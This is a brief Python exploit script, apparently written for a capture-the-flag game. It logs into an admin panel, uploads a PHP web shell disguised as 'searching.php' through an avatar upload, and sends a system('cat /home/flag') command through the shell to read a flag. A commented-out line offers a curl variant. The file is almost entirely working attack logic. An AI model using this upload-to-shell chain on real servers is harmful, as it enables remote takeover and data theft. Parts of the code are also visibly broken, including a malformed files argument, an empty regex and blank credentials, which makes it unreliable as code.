import requests
import re



def req(host,port):
    session = requests.Session()
    base_url = "http://"+host+":"+port

    login_url = base_url + "/admin/login"
    upload_url = base_url + "/avatar"


    login(session,login_url)
    shell_path = upload(session,upload_url)
    shell_url = base_url + '/uploads/' + shell_path

    exploit(session,shell_url)

def login(session,url):

    username = ""
    password = ""

    data = {
        "username":username,
        "password":password
    }

    session.post(url,data)

def upload(session,url):
    files = {
        {'file': ('searching.php', open('../webshell/shell.php', 'r'), '', {'Expires': '0'})}
    }

    resp = session.post(url,files=files)
    pattern = re.compile("")
    match =   re.search(pattern,resp.text).group()
    
    return  match

def exploit(session,url):
    data = {
        "0":"system('cat /home/flag')"
        # "0":"curl http://172.16.1.1/flag"
    }

    resp = session.post(url , data=data)
    pattern = re.compile("flag{\w+}")
    match = re.search(pattern,resp.text)
    print(match)
